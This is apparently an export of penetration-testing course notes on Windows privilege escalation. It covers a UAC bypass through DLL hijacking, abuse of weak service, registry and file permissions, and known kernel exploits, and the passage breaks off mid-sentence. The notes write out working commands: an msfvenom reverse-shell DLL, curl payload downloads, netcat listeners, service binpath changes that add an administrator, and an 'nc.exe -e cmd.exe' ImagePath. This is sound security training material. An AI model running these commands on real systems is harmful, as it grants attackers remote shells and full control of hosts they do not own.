UAC is Enabled\n\nThere is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token. First, let's confirm if UAC is enabled and, if so, at what level.\n\nUser Account Control\n\n```cmd-session\nC:\\htb> REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n    EnableLUA    REG_DWORD    0x1\n```\n\n#### Checking UAC Level\n\nUser Account Control\n\n```cmd-session\nC:\\htb> REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n    ConsentPromptBehaviorAdmin    REG_DWORD    0x5\n```\n\nThe value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.\n\n#### Checking Windows Version\n\nUAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.\n\nUser Account Control\n\n```powershell-session\nPS C:\\htb> [environment]::OSVersion.Version\n\nMajor  Minor  Build  Revision\n-----  -----  -----  --------\n10     0      14393  0\n```\n\nThis returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.\n\n![Table of Windows versions with details: Version 1507 to 2004, codenames Threshold 1 to 20H1, builds 10240 to 19041, marketing names from N/A to TBA, release dates from July 29, 2015, to first half of 2020.](https://academy.hackthebox.com/storage/modules/67/build.png)\n\nThe [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary `SystemPropertiesAdvanced.exe`. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.\n\nAccording to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.\n\nWhen attempting to locate a DLL, Windows will use the following search order.\n\n1. The directory from which the application loaded.\n2. The system directory `C:\\Windows\\System32` for 64-bit systems.\n3. The 16-bit system directory `C:\\Windows\\System` (not supported on 64-bit systems)\n4. The Windows directory.\n5. Any directories that are listed in the PATH environment variable.\n\n#### Reviewing Path Variable\n\nLet's examine the path variable using the command `cmd /c echo %PATH%`. This reveals the default folders below. The `WindowsApps` folder is within the user's profile and writable by the user.\n\nUser Account Control\n\n```powershell-session\nPS C:\\htb> cmd /c echo %PATH%\n\nC:\\Windows\\system32;\nC:\\Windows;\nC:\\Windows\\System32\\Wbem;\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;\nC:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps;\n```\n\nWe can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.\n\n#### Generating Malicious srrstr.dll DLL\n\nFirst, let's generate a DLL to execute a reverse shell.\n\nUser Account Control\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of dll file: 5120 bytes\n```\n\nNote: In the example above, we specified our tun0 VPN IP address.\n\n#### Starting Python HTTP Server on Attack Host\n\nCopy the generated DLL to a folder and set up a Python mini webserver to host it.\n\nUser Account Control\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 -m http.server 8080\n```\n\n#### Downloading DLL Target\n\nDownload the malicious DLL to the target system, and stand up a `Netcat` listener on our attack machine.\n\nUser Account Control\n\n```powershell-session\nPS C:\\htb>curl http://10.10.14.3:8080/srrstr.dll -O \"C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\"\n```\n\n#### Starting nc Listener on Attack Host\n\nUser Account Control\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lvnp 8443\n```\n\n#### Testing Connection\n\nIf we execute the malicious `srrstr.dll` file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using `rundll32.exe` to get a reverse shell connection.\n\nUser Account Control\n\n```cmd-session\nC:\\htb> rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\n```\n\nOnce we get a connection back, we'll see normal user rights.\n\nUser Account Control\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lnvp 8443\n\nlistening on [any] 8443 ...\n\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\n\nC:\\Users\\sarah> whoami /priv\n\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State   \n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled \nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n```\n\n#### Executing SystemPropertiesAdvanced.exe on Target Host\n\nBefore proceeding, we should ensure that any instances of the `rundll32` process from our previous execution have been terminated.\n\nCode: cmd\n\n```cmd\nC:\\htb> tasklist /svc | findstr \"rundll32\"\nrundll32.exe                  6300 N/A\nrundll32.exe                  5360 N/A\nrundll32.exe                  7044 N/A\n\nC:\\htb> taskkill /PID 7044 /F\nSUCCESS: The process with PID 7044 has been terminated.\n\nC:\\htb> taskkill /PID 6300 /F\nSUCCESS: The process with PID 6300 has been terminated.\n\nC:\\htb> taskkill /PID 5360 /F\nSUCCESS: The process with PID 5360 has been terminated.\n```\n\nNow, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.\n\nCode: cmd\n\n```cmd\nC:\\htb> C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe\n```\n\n#### Receiving Connection Back\n\nChecking back on our listener, we should receive a connection almost instantly.\n\nUser Account Control\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lvnp 8443\n\nlistening on [any] 8443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\n\nwhoami\nwinlpe-ws03\\sarah\n\n\nC:\\Windows\\system32>whoami /priv\n\nwhoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== ========\nSeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled\nSeSecurityPrivilege                       Manage auditing and security log                                   Disabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled\nSeSystemProfilePrivilege                  Profile system performance                                         Disabled\nSeSystemtimePrivilege                     Change the system time                                             Disabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Disabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled\nSeBackupPrivilege                         Back up files and directories                                      Disabled\nSeRestorePrivilege                        Restore files and directories                                      Disabled\nSeShutdownPrivilege                       Shut down the system                                               Disabled\nSeDebugPrivilege                          Debug programs                                                     Disabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled\nSeUndockPrivilege                         Remove computer from docking station                               Disabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled\nSeTimeZonePrivilege                       Change the time zone                                               Disabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled\n```\n\nThis is successful, and we receive an elevated shell that shows our privileges are available and can be enabled if needed.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/18-Weak Permissions",
    "path": "02_CPTS/17-Windows Privilege Escalation/18-Weak Permissions.md",
    "title": "18 Weak Permissions",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Weak Permissions --- Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to ...",
    "category": "02_CPTS",
    "content": "# Weak Permissions\n\n---\n\nPermissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available.\n\n---\n\n## Permissive File System ACLs\n\n#### Running SharpUp\n\nWe can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.\n\nWeak Permissions\n\n```powershell-session\nPS C:\\htb> .\\SharpUp.exe audit\n\n=== SharpUp: Running Privilege Escalation Checks ===\n\n\n=== Modifiable Service Binaries ===\n\n  Name             : SecurityService\n  DisplayName      : PC Security Management Service\n  Description      : Responsible for managing PC security\n  State            : Stopped\n  StartMode        : Auto\n  PathName         : \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"\n  \n  <SNIP>\n  \n```\n\nThe tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.\n\n#### Checking Permissions with icacls\n\nUsing [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.\n\nWeak Permissions\n\n```powershell-session\nPS C:\\htb> icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"\n\nC:\\Program Files (x86)\\PCProtect\\SecurityService.exe BUILTIN\\Users:(I)(F)\n                                                     Everyone:(I)(F)\n                                                     NT AUTHORITY\\SYSTEM:(I)(F)\n                                                     BUILTIN\\Administrators:(I)(F)\n                                                     APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\n                                                     APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\n#### Replacing Service Binary\n\nThis service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"\nC:\\htb> sc start SecurityService\n```\n\n---\n\n## Weak Service Permissions\n\n#### Reviewing SharpUp Again\n\nLet's check the `SharpUp` output again for any modifiable services. We see the `WindscribeService` is potentially misconfigured.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> SharpUp.exe audit\n \n=== SharpUp: Running Privilege Escalation Checks ===\n \n \n=== Modifiable Services ===\n \n  Name             : WindscribeService\n  DisplayName      : WindscribeService\n  Description      : Manages the firewall and controls the VPN tunnel\n  State            : Running\n  StartMode        : Auto\n  PathName         : \"C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\"\n```\n\n#### Checking Permissions with AccessChk\n\nNext, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> accesschk.exe /accepteula -quvcw WindscribeService\n \nAccesschk v6.13 - Reports effective permissions for securable objects\nCopyright ⌐ 2006-2020 Mark Russinovich\nSysinternals - www.sysinternals.com\n \nWindscribeService\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW NT AUTHORITY\\SYSTEM\n        SERVICE_ALL_ACCESS\n  RW BUILTIN\\Administrators\n        SERVICE_ALL_ACCESS\n  RW NT AUTHORITY\\Authenticated Users\n        SERVICE_ALL_ACCESS\n```\n\n#### Check Local Admin Group\n\nChecking the local administrators group confirms that our user `htb-student` is not a member.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> net localgroup administrators\n\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n \nMembers\n \n-------------------------------------------------------------------------------\nAdministrator\nmrb3n\nThe command completed successfully.\n```\n\n#### Changing the Service Binary Path\n\nWe can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> sc config WindscribeService binpath=\"cmd /c net localgroup administrators htb-student /add\"\n\n[SC] ChangeServiceConfig SUCCESS\n```\n\n#### Stopping Service\n\nNext, we must stop the service, so the new `binpath` command will run the next time it is started.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> sc stop WindscribeService\n \nSERVICE_NAME: WindscribeService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x4\n        WAIT_HINT          : 0x0\n```\n\n#### Starting the Service\n\nSince we have full control over the service, we can start it again, and the command we placed in the `binpath` will run even though an error message is returned. The service fails to start because the `binpath` is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the `binpath`.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> sc start WindscribeService\n\n[SC] StartService FAILED 1053:\n \nThe service did not respond to the start or control request in a timely fashion.\n```\n\n#### Confirming Local Admin Group Addition\n\nFinally, check to confirm that our user was added to the local administrators group.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> net localgroup administrators\n\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n \nMembers\n \n-------------------------------------------------------------------------------\nAdministrator\nhtb-student\nmrb3n\nThe command completed successfully.\n```\n\nAnother notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\\SYSTEM` account. Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.\n\n---\n\n## Weak Service Permissions - Cleanup\n\nWe can clean up after ourselves and ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable.\n\n#### Reverting the Binary Path\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> sc config WindScribeService binpath=\"c:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\"\n\n[SC] ChangeServiceConfig SUCCESS\n```\n\n#### Starting the Service Again\n\nIf all goes to plan, we can start the service again without an issue.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> sc start WindScribeService\n \nSERVICE_NAME: WindScribeService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n        PID                : 1716\n        FLAGS              :\n```\n\n#### Verifying Service is Running\n\nQuerying the service will show it running again as intended.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> sc query WindScribeService\n \nSERVICE_NAME: WindScribeService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  Running\n                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n    \n```\n\n---\n\n## Unquoted Service Path\n\nWhen a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.\n\n#### Service Binary Path\n\nWeak Permissions\n\n```shell-session\nC:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe\n```\n\nWindows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:\n\n- `C:\\Program`\n- `C:\\Program Files`\n- `C:\\Program Files (x86)\\System`\n- `C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64`\n\n#### Querying Service\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> sc qc SystemExplorerHelpService\n\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: SystemExplorerHelpService\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : System Explorer Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n```\n\nIf we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\\SYSTEM`.\n\n- `C:\\Program.exe\\`\n- `C:\\Program Files (x86)\\System.exe`\n\nHowever, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable.\n\n#### Searching for Unquoted Service Paths\n\nWe can identify unquoted service binary paths using the command below.\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\nGVFS.Service                                                                        GVFS.Service                              C:\\Program Files\\GVFS\\GVFS.Service.exe                                                 Auto\nSystem Explorer Service                                                             SystemExplorerHelpService                 C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe             Auto\nWindscribeService                                                                   WindscribeService                         C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe                                  Auto\n```\n\n---\n\n## Permissive Registry ACLs\n\nIt is also worth searching for weak service ACLs in the Windows Registry. We can do this using `accesschk`.\n\n#### Checking for Weak Service ACLs in Registry\n\nWeak Permissions\n\n```cmd-session\nC:\\htb> accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services\n\nAccesschk v6.13 - Reports effective permissions for securable objects\nCopyright ⌐ 2006-2020 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nRW HKLM\\System\\CurrentControlSet\\services\\ModelManagerService\n        KEY_ALL_ACCESS\n\n<SNIP> \n```\n\n#### Changing ImagePath with PowerShell\n\nWe can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:\n\nWeak Permissions\n\n```powershell-session\nPS C:\\htb> Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\"\n```\n\n---\n\n## Modifiable Registry Autorun Binary\n\n#### Check Startup Programs\n\nWe can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.\n\nWeak Permissions\n\n```powershell-session\nPS C:\\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl\n\nName     : OneDrive\ncommand  : \"C:\\Users\\mrb3n\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\nLocation : HKU\\S-1-5-21-2374636737-2633833024-1808968233-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : WINLPE-WS01\\mrb3n\n\nName     : Windscribe\ncommand  : \"C:\\Program Files (x86)\\Windscribe\\Windscribe.exe\" -os_restart\nLocation : HKU\\S-1-5-21-2374636737-2633833024-1808968233-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : WINLPE-WS01\\mrb3n\n\nName     : SecurityHealth\ncommand  : %windir%\\system32\\SecurityHealthSystray.exe\nLocation : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : Public\n\nName     : VMware User Process\ncommand  : \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr\nLocation : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : Public\n\nName     : VMware VM3DService Process\ncommand  : \"C:\\WINDOWS\\system32\\vm3dservice.exe\" -u\nLocation : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nUser     : Public\n```\n\nThis [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/19-Kernel Exploits",
    "path": "02_CPTS/17-Windows Privilege Escalation/19-Kernel Exploits.md",
    "title": "19 Kernel Exploits",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Kernel Exploits --- It's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. Assumin...",
    "category": "02_CPTS",
    "content": "# Kernel Exploits\n\n---\n\nIt's a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. Assuming a computer has been targeted for installation of updates, for example, using SCCM (Microsoft System Center Configuration Manager) or WSUS (Windows Server Update Services), there are still many reasons they could fail to install. Over the years, there have been many kernel exploits that affect the Windows operating system from Windows 2000/XP up to Windows 10/Server 2016/2019. Below can be found a detailed table of known remote code execution/local privilege escalation exploits for Windows operating systems, broken down by service pack level, from Windows XP onward to Server 2016.\n\n|Base OS|XP||||2003|||Vista|||2008||7||2008R2||8|8.1|2012|2012R2|10|2016|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Service Pack|SP0|SP1|SP2|SP3|SP0|SP1|SP2|SP0|SP1|SP2|SP0|SP2|SP0|SP1|SP0|SP1|||||||\n|MS03-026|•|•|•|•|•|•|•||||||||||||||||\n|MS05-039|•|•|•||•|•|||||||||||||||||\n|MS08-025|•|•|•||•|•|•|•|•||•||||||||||||\n|MS08-067|•|•|•|•|•|•|•|•|•||•||||||||||||\n|MS08-068|•|•|•|•|•|•|•|•|•||•||||||||||||\n|MS09-012|•|•|•|•|•|•|•|•|•||•||||||||||||\n|MS09-050||||||||•|•|•|•|•|||||||||||\n|MS10-015|||•|•|•|•|•|•|•|•|||||||||||||\n|MS10-059||||||||•|•|•|•|•|•||•||||||||\n|MS10-092||||||||•|•|•|•|•|•||•||||||||\n|MS11-011||||•|•|•|•|•|•|•|•|•|•||•||||||||\n|MS11-046||||•|•|•|•|•|•|•|•|•|•|•|•|•|||||||\n|MS11-062||||•|•|•|•||||||||||||||||\n|MS11-080||||•|•|•|•||||||||||||||||\n|MS13-005||||||||•|•|•|•|•|•|•|•|•|•||•||||\n|MS13-053||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||\n|MS13-081|||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||\n|MS14-002||||•|•|•|•||||||||||||||||\n|MS14-040|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS14-058|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS14-062|||||•|•|•||||||||||||||||\n|MS14-068|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS14-070|||||•|•|•||||||||||||||||\n|MS15-001|||||||||||||•|•|•|•|•|•|•|•|||\n|MS15-010|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS15-051|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS15-061|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS15-076|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS15-078||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|||\n|MS15-097||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||\n|MS16-016||||||||•|•|•|•|•|•|•|•|•|||||||\n|MS16-032||||||||•|•|•|•|•|•|•|•|•||•|•|•|||\n|MS16-135||||||||•|•|•|•|•|•|•|•|•||•|•|•|•|•|\n|MS17-010||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|\n|CVE-2017-0213: COM Aggregate Marshaler|||||||||||||•|•|•|•|•|•|•|•|•|•|\n|Hot Potato|||||||||||||•|•|•|•|•|•|•|•|•||\n|SmashedPotato|||||||||||||•|•|•|•|•|•|•|•|•||\n\nNote: This table is not 100% complete, and does not go past 2017. As of today, there are more known vulnerabilities for the newer operating system versions and even Server 2019.\n\nThis [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has 4,733 security vulnerabilities entered at the time of writing, showing the massive attack surface that a Windows environment presents.\n\nAs we can see from this table, there are many exploits that work for Windows XP up through Server 2012R2. As we get to Windows 10 and Server 2016, there are fewer known exploits. This is partly due to changes to the operating system over time, including security improvements and deprecation of older versions of protocols such as SMB. One important thing to note from this table is that when new vulnerabilities are discovered or exploits released (such as MS17-010), these usually trickle down and affect prior operating system versions. This is why it is vital to stay on top of patching or upgrading, retiring, or segregating off Windows systems that have reached end of life. We will explore this in more depth later on in this module.\n\nIt is important to note that while some of the examples above `are` remote code execution vulnerabilities, we can just as easily use them to escalate privileges. One example is if we gain access to a system and notice a port such as 445 (SMB service) not accessible from the outside, we may be able to privilege escalate if it is vulnerable to something such as EternalBlue (MS17-010). In this case, we could either port forward the port in question to be accessible from our attack host or run the exploit in question locally to escalate privileges.\n\n---\n\n## Notable Vulnerabilities\n\nOver the years, there have been many high-impact Windows vulnerabilities that can be leveraged to escalate privileges, some being purely local privilege escalation vectors and others being remote code execution (RCE) flaws that can be used to escalate privileges by forwarding a local port. One example of the latter would be landing on a box that does not allow access to port 445 from the outside, performing port forward to access this port from our attack box, and leveraging a remote code execution flaw against the SMB service to escalate privileges. Below are some extremely high-impact Windows vulnerabilities over the years that can be leveraged to escalate privileges.\n\n`MS08-067` - This was a remote code execution vulnerability in the \"Server\" service due to improper handling of RPC requests. This affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista and allows an unauthenticated attacker to execute arbitrary code with SYSTEM privileges. Though typically encountered in client environments as a remote code execution vulnerability, we may land on a host where the SMB service is blocked via the firewall. We can use this to escalate privileges after forwarding port 445 back to our attack box. Though this is a \"legacy\" vulnerability, I still do see this pop up from time to time in large organizations, especially those in the medical industry who may be running specific applications that only work on older versions of Windows Server/Desktop. We should not discount older vulnerabilities even in 2021. We will run into every scenario under the sun while performing client assessments and must be ready to account for all possibilities. The box [Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html) on the Hack The Box platform showcases this vulnerability from the remote code execution standpoint. There are standalone as well as a Metasploit version of this exploit.\n\n`MS17-010` - Also known as [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. As with MS08-067, this vulnerability can also be leveraged as a local privilege escalation vector if we land on a host where port 445 is firewalled off. There are various versions of this exploit for the Metasploit Framework as well as standalone exploit scripts. This attack was showcased in the [Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html) box on Hack The Box, again from the remote standpoint.\n\n`ALPC Task Scheduler 0-Day` - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to `.job` files located in the `C:\\Windows\\tasks` directory. An 